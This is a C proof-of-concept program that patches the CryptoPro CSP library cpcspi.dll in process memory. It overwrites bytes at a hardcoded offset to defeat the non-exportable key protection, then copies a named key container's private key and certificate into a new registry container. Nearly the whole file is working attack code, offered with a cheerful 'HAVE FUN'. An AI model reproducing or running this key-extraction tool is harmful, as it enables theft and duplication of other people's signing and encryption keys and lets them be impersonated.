/*
THIS POC DEMONSTRATES HOW TO PATCH CPCSPI.DLL WHICH
       IS LOADED INTO OUR PROCESS MEMORY ...
AND THEN CODE COPIES CRYPTO PRO CONTAINER U SPECIFIED
	   AS A PARAMETER INTO NEWLY CREATED 
CONTAINER IN REGISTRY WITH NAME DESTCOPY ............

	             ,-"     "-.
	            / o       o \
	           /   \     /   \
		      /     )-"-(     \
			 /     ( 6 6 )     \
	        /       \ " /       \
		   /         )=(         \
	      /   o   .--"-"--.   o   \
		 /    I  /  -   -  \  I    \
	 .--(    (_}y/\       /\y{_)    )--.
	(    ".___l\/__\_____/__\/l___,"    )
	 \                                 /
	  "-._      o O o O o O o      _,-"
	     `--Y--.___________.--Y--'
	        |==.___________.==|
	        `==.___________.==' 

				HAVE FUN!!!
BUT REMEMBER THAT U USE THIS CODE AT YOUR OWN RISK!!!

~~~~~~CODE IS WRITTEN ON PURE M$ CRYPTO API~~~~~~
									  by 0ang3el
*/

#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include "Psapi.h"
#include "Shlwapi.h"

#pragma comment(lib,"Psapi.lib")
#pragma comment(lib,"ShLwApi.lib")


static void HandleError(char *s);
static void CleanUp(void);

static HCRYPTPROV hProvResponder = 0;    
static HCRYPTPROV hProvSender = 0;	   
static HCRYPTKEY hSenderKey = 0;	   
static HCRYPTKEY hResponderKey = 0;       
static HCRYPTKEY hSenderEphemKey = 0;     
static HCRYPTKEY hResponderEphemKey = 0; 
static HCRYPTKEY hSenderAgreeKey = 0;	   
static HCRYPTKEY hResponderAgreeKey = 0;  
static BYTE *pbKeyBlob = NULL;		   

int  main (int argc, char *argv[])
{


    DWORD dwProvType = 75;  //GOST-2001-DH;   
    DWORD data_len = 0;			    
    BYTE *oid = NULL;			    
    DWORD dwBlobLen = 0;		    
    DWORD cAlg = (ALG_CLASS_DATA_ENCRYPT | ALG_TYPE_BLOCK | 31);

	LPCSTR SourceName = NULL;
	LPCSTR Psdw = NULL;

	HANDLE hCurrProc = GetCurrentProcess();
	char patch[] = {0x80,0xbd,0x1c,0x00,0x00,0x00,0x98,0x75,0x07,0xc6,0x85,0x1c,0x00,0x00,0x00,0x9c,0x90,0x90,0x90,0x90,0x90,0x90}; ///HERE IS THE PATCH!!!
	int patchLen = sizeof(patch);
	DWORD previous = 0;

	DWORD writeAddr = 0x11BC2;// INITIALIZED with offset!!!  //0x611E1BC2;


	/// PARSE COMMAND PARAMETERS HERE
	for (int n = 1;n < argc;n++) {
		if (n+1 >= argc)
			break;
		if (strcmp(argv[n],"-p") == 0) {
			Psdw = argv[++n];
		}
		if (strcmp(argv[n],"-s") == 0) {
			SourceName = argv[++n];
		}
	}
	if (!Psdw || !SourceName) {
		printf("[!] Dude, u specified incorrect parameters :/\n\tUsage: %s -s <source container name> -p <container password>",argv[0]);
		exit(1);
	}


    if(!CryptAcquireContextA(
	&hProvResponder, 
	"\\\\.\\Registry\\DestCopy", //Hardcoded name for container we create!!!
	NULL,
	dwProvType,
	CRYPT_NEWKEYSET | CRYPT_SILENT))
    {
		HandleError("Error during CryptAcquireContext");
    }


    if(!CryptAcquireContextA(
	&hProvSender, 
	SourceName, 
	NULL, 
	dwProvType, 
	0)) 
    {
		HandleError("Error during CryptAcquireContext");
    }

	/// FIND ADDRESS TO PATCH
	HMODULE hModules[1024];
	DWORD needed;
	if (EnumProcessModules(hCurrProc,hModules,1024,&needed)) {
		for (int i = 0; i < (needed / sizeof(HMODULE)); i++ )
        {
            char szModName[1024];

            if ( GetModuleFileNameA( hModules[i], szModName, sizeof(szModName)))
            {
				if (StrStrA(szModName, "cpcspi.dll")) {
					writeAddr += (DWORD)hModules[i];
					printf("[+] Address in memory for patching is '%08X'.\n",writeAddr);
					break;
				}
            }
        }
	}

	
	/// MEMORY PATCHING HAPPENS HERE
	printf("[+] Now we patch process memory, patch size is '%i' bytes...",patchLen);
	VirtualProtectEx(hCurrProc, (void*)writeAddr, 2, PAGE_EXECUTE_READWRITE, &previous);
	WriteProcessMemory(hCurrProc, (void*)writeAddr, &patch, patchLen, NULL);
	printf("Ok\n");

	printf("[+] Now we export container '%s'...\n",SourceName);

	if(!CryptGetProvParam( 
	hProvSender, 
	92, 
	NULL, 
	&data_len, 
	0))
    {
		HandleError("Error computing buffer length");
    }

    oid = (BYTE *)malloc( data_len );
    if( !oid )
		HandleError("Out of memory.");


    if(!CryptGetProvParam( 
	hProvSender, 
	92, 
	oid, 
	&data_len, 
	0))
    {
		HandleError("Error during CryptGetProvParam");
    }


    if(!CryptSetProvParam(
	hProvResponder, 
	92, 
	oid, 
	0 ))
    {
		free( oid );
		HandleError("Error during CryptSetProvParam");
    }

    free( oid );

    data_len = 0;


    if(!CryptGetProvParam( 
	hProvSender, 
	93, 
	NULL, 
	&data_len, 
	0))
    {
		HandleError("Error computing buffer length");
    }

	/// SPECIFY PASSWORD FOR CONTAINER HERE
	if(!CryptSetProvParam( hProvSender,PP_SIGNATURE_PIN,(LPBYTE)Psdw,0))
	{
	    HandleError("Error during CryptSetProvParam");
	}

    oid = (BYTE *)malloc( data_len );
    if( !oid )
		HandleError("Out of memory");

    if(!CryptGetProvParam( 
	hProvSender, 
	93, 
	oid, 
	&data_len, 
	0))
    {
		free( oid );
		HandleError("Error during CryptGetProvParam");
    }

    if(!CryptSetProvParam(
	hProvResponder, 
	93, 
	oid, 
	0 ))
    {
		free( oid );
		HandleError("Error during CryptSetProvParam");
    }
    free( oid );


    if(!CryptGetUserKey( 
	hProvSender, 
	AT_KEYEXCHANGE, 
	&hSenderKey )) 
    {
		HandleError("Error during CryptGetUserKey private key");
    }		

	
    if(!CryptGenKey(
	hProvSender, 
	(ALG_CLASS_KEY_EXCHANGE | ALG_TYPE_DH | 37), 
	CRYPT_EXPORTABLE, 
	&hSenderEphemKey)) 
    {
		HandleError("ERROR -- CryptGenKey");
    }
	
	
    if(!CryptGenKey(
	hProvResponder, 
	(ALG_CLASS_KEY_EXCHANGE | ALG_TYPE_DH | 37), 
	CRYPT_EXPORTABLE | CRYPT_PREGEN,
	&hResponderEphemKey))
    {
		HandleError("ERROR -- CryptGenKey");
    }
	
	
    if(!CryptGetKeyParam( 
	hSenderEphemKey, 
	106, 
	NULL, 
	&dwBlobLen, 
	0))
    {
		HandleError("Error computing BLOB length");
    }

    pbKeyBlob = (BYTE*)malloc(dwBlobLen);
    if(!pbKeyBlob)
		HandleError("Out of memory");


    if(!CryptGetKeyParam( 
	hSenderEphemKey, 
	106, 
	pbKeyBlob, 
	&dwBlobLen, 
	0))
    {
		HandleError("Error during CryptGetProvParam");
    }

    if(!CryptSetKeyParam(
	hResponderEphemKey, 
	106, 
	pbKeyBlob, 
	0))
    {
		HandleError("Error during CryptSetProvParam");
    }

    free(pbKeyBlob);
    pbKeyBlob = NULL; 
    dwBlobLen = 0;


    if(!CryptSetKeyParam(
	hResponderEphemKey, 
	KP_X, 
	NULL, 
	0))
    {
		HandleError("Error during CryptSetKeyParam");
    }

    if(!CryptExportKey(
	hSenderEphemKey,
	0, 
	PUBLICKEYBLOB,
	0, 
	NULL,
	&dwBlobLen ))
    {
		HandleError("Error computing BLOB length");
    }

    pbKeyBlob = (BYTE*)malloc(dwBlobLen);
    if(!pbKeyBlob) 
		HandleError("Out of memory");

    if(!CryptExportKey(
	hSenderEphemKey,
	0, 
	PUBLICKEYBLOB,
	0, 
	pbKeyBlob,
	&dwBlobLen ))
    {
		HandleError("Error during CryptExportKey");
    }


    if(!CryptImportKey(
	hProvResponder, 
	pbKeyBlob, 
	dwBlobLen, 
	hResponderEphemKey, 
	0, 
	&hResponderAgreeKey))
    {
		HandleError("Error during CryptImportKey ephemeral key");
    }


    free(pbKeyBlob);
    pbKeyBlob = NULL; 
    dwBlobLen = 0;


    if(!CryptExportKey(
	hResponderEphemKey,
	0, 
	PUBLICKEYBLOB,
	0, 
	NULL,
	&dwBlobLen ))
    {
		HandleError("Error computing BLOB length");
    }

    pbKeyBlob = (BYTE*)malloc(dwBlobLen);
    if(!pbKeyBlob) 
		HandleError("Out of memory");

    if(!CryptExportKey(
	hResponderEphemKey,
	0, 
	PUBLICKEYBLOB,
	0, 
	pbKeyBlob,
	&dwBlobLen ))
    {
		HandleError("Error during CryptExportKey");
    }

 

    if(!CryptImportKey(
	hProvSender, 
	pbKeyBlob, 
	dwBlobLen, 
	hSenderEphemKey, 
	0, 
	&hSenderAgreeKey))
    {
		HandleError("Error during CryptImportKey ephemeral key");
    }


    free(pbKeyBlob);
    pbKeyBlob = NULL; 
    dwBlobLen = 0;


    if(!CryptSetKeyParam(
	hSenderAgreeKey,
	KP_ALGID, 
	(BYTE*)&cAlg,
	0 ))
    {
		HandleError("Error during CryptSetKeyParam agree key");
    }


    if(!CryptSetKeyParam(
	hResponderAgreeKey,
	KP_ALGID, 
	(BYTE*)&cAlg,
	0 ))
    {
		HandleError("Error during CryptSetKeyParam agree key");
    }
	

    if(!CryptExportKey(
	hSenderKey,
	hSenderAgreeKey, 
	PRIVATEKEYBLOB,
	0, 
	NULL,
	&dwBlobLen ))
    {
		HandleError("Error computing BLOB length");
    }

    pbKeyBlob = (BYTE*)malloc(dwBlobLen);
    if(!pbKeyBlob) 
		HandleError("Out of memory");

    if(!CryptExportKey(
	hSenderKey,
	hSenderAgreeKey, 
	PRIVATEKEYBLOB,
	0, 
	pbKeyBlob,
	&dwBlobLen ))
    {
		HandleError("Error during CryptExportKey");
    }



    if(!CryptImportKey(
	hProvResponder, 
	pbKeyBlob, 
	dwBlobLen, 
	hResponderAgreeKey, 
	0,
	&hResponderKey))
    {
		HandleError("Error during CryptImportKey private key");
    }


    free(pbKeyBlob);
    pbKeyBlob = NULL; 
    dwBlobLen = 0;



    if(!CryptGetKeyParam( 
	hSenderKey, 
	KP_CERTIFICATE, 
	NULL, 
	&dwBlobLen, 
	0))
    {
		HandleError("Error computing BLOB length");
    }

    pbKeyBlob = (BYTE*)malloc(dwBlobLen);

    if(!pbKeyBlob)
    {
		HandleError("Out of memory");
    }


    if(!CryptGetKeyParam( 
	hSenderKey, 
	KP_CERTIFICATE, 
	pbKeyBlob, 
	&dwBlobLen, 
	0))
    {
		HandleError("Error during CryptGetProvParam");
    }

    if(!CryptSetKeyParam(
	hResponderKey, 
	KP_CERTIFICATE, 
	pbKeyBlob, 
	0))
    {
		HandleError("Error during CryptSetProvParam");
    }

	printf("[+] D0n3!!!\n");

    CleanUp();
    return 0;
}

void CleanUp(void)
{
    free(pbKeyBlob);


    if(hProvResponder) 
	CryptReleaseContext(hProvResponder, 0);
    if(hProvSender) 
	CryptReleaseContext(hProvSender, 0);

   
    if(hSenderKey)
	CryptDestroyKey(hSenderKey);

    if(hResponderKey)
	CryptDestroyKey(hResponderKey);

    if(hSenderEphemKey)
	CryptDestroyKey(hSenderEphemKey);

    if(hResponderEphemKey)
	CryptDestroyKey(hResponderEphemKey);

    if(hSenderAgreeKey)
	CryptDestroyKey(hSenderAgreeKey);

    if(hResponderAgreeKey)
	CryptDestroyKey(hResponderAgreeKey);
}



void HandleError(char *s)
{
    DWORD err = GetLastError();
    printf("[!] Damn, error: '%s'. Error number: '0x%x'.\n", s, err);
    CleanUp();
    if(!err) err = 1;
    exit(err);
}